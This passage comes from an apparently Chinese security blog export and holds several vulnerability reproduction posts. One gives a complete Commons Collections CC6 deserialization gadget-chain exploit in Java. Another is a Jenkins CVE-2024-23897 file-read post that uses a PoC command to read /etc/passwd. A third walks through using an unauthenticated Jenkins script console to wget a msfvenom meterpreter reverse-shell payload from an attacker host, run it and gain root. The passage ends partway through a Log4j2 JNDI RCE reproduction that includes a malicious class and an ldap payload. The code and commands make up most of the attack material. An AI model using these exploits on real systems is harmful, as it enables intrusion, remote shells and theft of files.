java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/8/6 10:58 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc6demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; hashMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TiedMapEntry</span> <span class=\"variable\">tiedMapEntry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TiedMapEntry</span>(lazyMap, <span class=\"string\">&quot;qwe&quot;</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; objcc6 = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        objcc6.put(tiedMapEntry,<span class=\"string\">&quot;asd&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(objcc6);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"RaC2RUbTqHIRx3C93PzaO1ajXLmG2i-m7SxXSSAYmJA.png\" alt=\"image\"></p>\n<p>因为在put的时候就调用了hash对key进行hash，从而就直接触发我们构造的链了。</p>\n<p><img src=\"Ryhb3ypacdm_6dKf7RMigHeZpMBimfeR1Vp-SM1-2t4.png\" alt=\"image\"></p>\n<p> 捋一下现在的情况是，tiedMapEntry里面套着一个lazyMap，lazyMap里面套这一个chainedTransformer，chainedTransformer里面套着transformer。这几个里面可以把任意一个修改为空的就行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">tiedMapEntry---lazyMap---chainedTransformer---transformer</span><br></pre></td></tr></table></figure>\n<p>这里我们通过反射修改lazyMap为空。</p>\n<p>我们一开始序列化的时候给map先传入的是没用的chainedTransformer(1)，然后再传入的是执行命令的chainedTransformer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantFactory</span>(<span class=\"number\">1</span>));        </span><br><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> LazyMap.class;</span><br><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">factoryField</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">factoryField = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">factoryField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure>\n<p><img src=\"gHWHqBWjaYhVwliZ0EdV79aBR-oCDvRd3GOpbJwOYrQ.png\" alt=\"image\"></p>\n<p>进行序列化和反序列化，发现还是没能执行成功。</p>\n<p><img src=\"UEdzKBjDnnQnsWPzS4xLqu3xmrigif5GFoiV6Qu_pD8.png\" alt=\"image\"></p>\n<p>我们分析一下看看；当进行put的时候，就调用了hash</p>\n<p><img src=\"YwpIQGRQ2SMpl3PxizuAak4rMD2IxFHroBx70Af-6AQ.png\" alt=\"image\"></p>\n<p>紧接着就是hashcode</p>\n<p><img src=\"251Yg7En3NZ5U1nmf99Mj1IyXiG5QA0zoSE2cR8dnBk.png\" alt=\"image\"></p>\n<p>然后就到tiedMapEntry的hashcode</p>\n<p><img src=\"tGhMaRFX5eChkitCRb0Ym8W-IZdMqm1Uzdmak69YcCw.png\" alt=\"image\"></p>\n<p>然后我们看到在get里面调用完transform之后就会把key又put进去。</p>\n<p><img src=\"yBfAIumMqn3dOY4h61bDGPSJTVme14HPbVQTtcHrkU8.png\" alt=\"image\"></p>\n<p>也就是说反序列化的时候就有这个key了，所以我们需要把它移出来（删掉）即可。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">lazyMap.remove(<span class=\"string\">&quot;qwe&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>最终的代码为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/8/6 10:58 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc6demo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; hashMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantFactory</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TiedMapEntry</span> <span class=\"variable\">tiedMapEntry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TiedMapEntry</span>(lazyMap, <span class=\"string\">&quot;qwe&quot;</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; objcc6 = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        objcc6.put(tiedMapEntry,<span class=\"string\">&quot;asd&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(<span class=\"string\">&quot;qwe&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> LazyMap.class;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">factoryField</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        factoryField = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factoryField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(objcc6);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"ChqoiGgI-tpoewpSFiHYgtmV_H9vhJvQTLi1YHnI6yw.png\" alt=\"image\"></p>\n<p>完整的调用链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Gadget chain:</span><br><span class=\"line\">java.io.ObjectInputStream.readObject()</span><br><span class=\"line\">    java.util.HashSet.readObject()</span><br><span class=\"line\">        java.util.HashMap.put()</span><br><span class=\"line\">        java.util.HashMap.hash()</span><br><span class=\"line\">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class=\"line\">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class=\"line\">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class=\"line\">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class=\"line\">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class=\"line\">                    java.lang.reflect.Method.invoke()</span><br><span class=\"line\">                        java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p><img src=\"JIBdTEcBguto3gH8-99V-35YAGa7x4tLUE_vQJUE0FM.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.本文先是以另一种形式实现了cc1，主要是为后面cc6也用到lazyMap做铺垫</p>\n<p>2.分析了cc1的修复方式之后，使用TiedMapEntry结合URLDNS链的来实现cc6</p>\n<p>3.为了避免在序列化就触发，所以修改了传入map的Transformer，先传入一个没用的，然后再传入一个正常的；通过反射修改lazy传入的为空</p>\n<p>4.发现反序列化的时候没能成功执行，分析得知是TiedMapEntry还会把key put进去，移除后即可</p>\n","categories":["Java安全"],"tags":["漏洞复现","反序列化","CC链"]},{"title":"Jenkins任意文件读取漏洞（CVE-2024-23897）","url":"/2024/01/26/Jenkins%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23897%EF%BC%89/","content":"<h1 id=\"Jenkins任意文件读取漏洞（CVE-2024-23897）\"><a href=\"#Jenkins任意文件读取漏洞（CVE-2024-23897）\" class=\"headerlink\" title=\"Jenkins任意文件读取漏洞（CVE-2024-23897）\"></a>Jenkins任意文件读取漏洞（CVE-2024-23897）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Jenkins是一款开源CI&amp;CD软件，用于自动化各种任务，包括构建、测试和部署软件。Jenkins有一个内置的命令行界面（CLI），可从脚本或shell环境访问Jenkins。处理CLI命令时，Jenkins使用args4j库解析Jenkins控制器上的命令参数和选项。</p>\n<h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a><strong>漏洞成因</strong></h2><p>在处理CLI命令时，Jenkins使用args4j库解析Jenkins控制器上的命令参数和选项。此命令解析器具有将参数中的@字符后跟文件路径替换为文件内容（expandAtFiles）的功能。此功能默认启用，Jenkins 2.441及更早版本、LTS 2.426.2及更早版本不会禁用它。</p>\n<p><img src=\"N6qEie2lsHRrhxZj3Tn_XjDl-Jw4ikWFoyivdMY7p28.png\" alt=\"image\"></p>\n<h2 id=\"影响版本范围\"><a href=\"#影响版本范围\" class=\"headerlink\" title=\"影响版本范围\"></a><strong>影响版本范围</strong></h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Jenkins &lt;= 2.441</span><br><span class=\"line\">Jenkins LTS &lt;= 2.426.2</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>可以使用docker自行在本地部署环境后进行验证</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull jenkins/jenkins:<span class=\"number\">2.426</span><span class=\"number\">.2</span>-lts</span><br></pre></td></tr></table></figure>\n<p><img src=\"qAH5PEm8pCZrQ6PO_pnlgOcEq_Yr59tqq6WWfeCE8fk.png\" alt=\"image\"></p>\n<p>使用命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 poc.py http://x.x.x.x:8080 /etc/passwd </span><br></pre></td></tr></table></figure>\n<p><img src=\"QquizRNtEGlpCtwcYi3ev6MIReBKIU86uBfYcg38tRU.png\" alt=\"image\"></p>\n<h2 id=\"影响\"><a href=\"#影响\" class=\"headerlink\" title=\"影响\"></a>影响</h2><p>任意文件读取：拥有Overall&#x2F;Read权限的攻击者可以读取整个文件。</p>\n<p>远程代码执行：攻击者能通过漏洞读取到二进制形式密钥</p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>Jenkins 2.442， LTS 2.426.3已禁用相关命令解析器特性。建议更新至这些版本以解决漏洞。</p>\n<p>收入到内网，若在公网暴露可设置ACL仅允许可信IP进行访问</p>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"Jenkins未授权-反弹shell","url":"/2022/10/18/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%8F%8D%E5%BC%B9shell/","content":"<h1 id=\"Jenkins未授权-反弹shell\"><a href=\"#Jenkins未授权-反弹shell\" class=\"headerlink\" title=\"Jenkins未授权-反弹shell\"></a>Jenkins未授权-反弹shell</h1><p>最近对公司测试网进行渗透，发现了个未授权的Jenkins。</p>\n<ol>\n<li>发现未授权的Jenkins</li>\n</ol>\n<p><img src=\"T3vpMCGTkj5Dstyjc3iL8b0gBP3PC3H1yk2wVmlVYX4.png\" alt=\"image\"></p>\n<ol start=\"2\">\n<li>转到脚本执行处：<a href=\"http://192.168.1.226:9090/script\">http://192.168.1.226:9090/script</a></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">println <span class=\"string\">&quot;ifconfig&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>\n<p><img src=\"flOhF5BmBJuSRroKuMTZJ9F2E1kWDnwgOhKN76YoiWw.png\" alt=\"image\"></p>\n<ol start=\"3\">\n<li>生成反弹shell的脚本</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p python/meterpreter/reverse_tcp LHOST=172.16.16.126 LPORT=9901 -f raw &gt;/var/www/html/jdk.py</span><br></pre></td></tr></table></figure>\n<p><img src=\"fi0zwlzHb-FAMSbcZvJW0f1j3l49E1z58ItW0c4a-w0.png\" alt=\"image\"></p>\n<ol start=\"4\">\n<li>开启apache</li>\n</ol>\n<p><img src=\"-dDQDxAbEle25BiImSd-NpuhSEuSYKLSgbwTDrVluk0.png\" alt=\"image\"></p>\n<ol start=\"5\">\n<li>Kali中使用msfconsole开启反弹shell监听</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">msf6 &gt; use exploit/multi/handler</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> lhost 172.16.16.126</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> lport 9901</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; <span class=\"built_in\">set</span> payload python/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>\n<p><img src=\"iB2U-4XWhYc-cU25t7ClztVAcq_8CgNkYLz-jBGTHkc.png\" alt=\"image\"></p>\n<ol start=\"6\">\n<li>接着命令执行通过wget将后门文件jdk.py下载到本机Jenkins目录下，Result没有报错证明执行成功</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">println <span class=\"string\">&quot;wget http://172.16.16.126/jdk.py -P /&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"61VbmDfdjN3dLbGVpB8rPVyyxbuo90mmDAGFcdyRIMI.png\" alt=\"image\"></p>\n<ol start=\"7\">\n<li>执行后门文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">println <span class=\"string\">&quot;python jdk.py&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>\n<p><img src=\"T2_Rqe_dV0IWnNXUBrpg2YqFLZjVJuu6g65Pz353Dmw.png\" alt=\"image\"></p>\n<ol start=\"8\">\n<li>成功监听上线拿到root权限。</li>\n</ol>\n<p><img src=\"dov44CzHvmAkciqMne4d8oyWXArPR6lF3JNJM-_Nezc.png\" alt=\"image\"></p>\n","categories":["渗透笔记"],"tags":["未授权","shell"]},{"title":"Log4j2 RCE windows本地复现","url":"/2021/12/11/Log4j2%20RCE%20windows%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/","content":"<h1 id=\"Log4j2-RCE-windows本地复现\"><a href=\"#Log4j2-RCE-windows本地复现\" class=\"headerlink\" title=\"Log4j2 RCE windows本地复现\"></a>Log4j2 RCE windows本地复现</h1><p>注意：先确认该JDK是否默认支持运行jndi</p>\n<p>漏洞刚出不久，影响范围巨大，虽然忙着给公司资产排查漏洞，同时在此进行简单的漏洞复现。</p>\n<p>1.创建一个恶意的类，这里创建一个弹出计算器的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;calc.exe&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>MAC系统的恶意类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Exploit</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Exploit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 要执行的命令</span></span><br><span class=\"line\">            String[] commands = &#123;<span class=\"string\">&quot;open&quot;</span>, <span class=\"string\">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class=\"line\">            <span class=\"type\">Process</span> <span class=\"variable\">pc</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] argv)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Exploit</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Exploit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>2.编译成class类之后运行</p>\n<p>java Exploit</p>\n<p><img src=\"05d8f9b7-19d7-487c-b437-7dcf20f2214f.jpg\" alt=\"image\"></p>\n<p>3.创建一个log4j的类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.LogManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">log4j</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Logger</span> <span class=\"variable\">logger</span> <span class=\"operator\">=</span> LogManager.getLogger(log4j.class);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">logger.error(<span class=\"string\">&quot;$&#123;jndi:ldap://127.0.0.1:1389/a&#125;&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>4.尝试运行，但是发现报错了</p>\n<p><img src=\"7e1bdd42-9f5d-49fd-860d-1e241abc43d4.png\" 